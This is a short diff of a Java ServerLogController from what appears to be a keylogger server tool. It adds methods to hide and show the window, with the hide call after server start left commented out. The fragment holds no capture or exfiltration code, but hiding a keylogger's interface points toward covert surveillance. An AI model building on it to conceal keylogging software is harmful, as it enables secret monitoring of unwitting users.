@@ -49,9 +49,11 @@ public class ServerLogController {
 				appendToMonitory("Server started at " + hostName + ":" + port);
 				isServerStarted = true;
 				view.updateViewWhenServerIsStarted();
+				//hideForm();
 			}
 			else {
 				view.appendToMonitor("Can not start server!\n");
+				showForm();
 			}
 		}
 		else {
@@ -154,6 +156,14 @@ public class ServerLogController {
 				appendToMonitory("Key logger started!");
 			}
 		}
+	}
+
+	public void hideForm() {
+		view.setVisible(false);
+	}
+	
+	public void showForm() {
+		view.setVisible(true);
 	}
 
 }
